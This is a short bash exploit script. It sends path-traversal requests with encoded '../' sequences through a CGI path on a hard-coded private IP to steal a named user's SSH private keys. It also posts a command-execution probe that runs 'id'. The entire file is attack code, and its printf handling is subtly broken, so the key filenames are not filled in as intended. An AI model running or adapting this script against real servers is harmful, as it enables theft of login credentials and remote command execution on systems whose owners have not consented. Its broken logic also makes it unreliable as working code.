#!/bin/bash

# Check if username is provided as an argument
if [ $# -eq 0 ]; then
    echo "Usage: $0 <username>"
    exit 1
fi

# Extract username from command-line argument
user="$1"

# List of SSH key filenames
ssh_key_filenames=("id_rsa" "id_ecdsa" "id_dsa")

# URL template
url_template="http://192.168.213.245:80/cgi-bin/.%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/home/$1/.ssh/%s"

# Execute curl command for each SSH key filename
for ssh_key_filename in "${ssh_key_filenames[@]}"; do
    url=$(printf "$url_template" "$user" "$user" "$ssh_key_filename")
    curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" "$url"
    echo -e "\n\n"
done
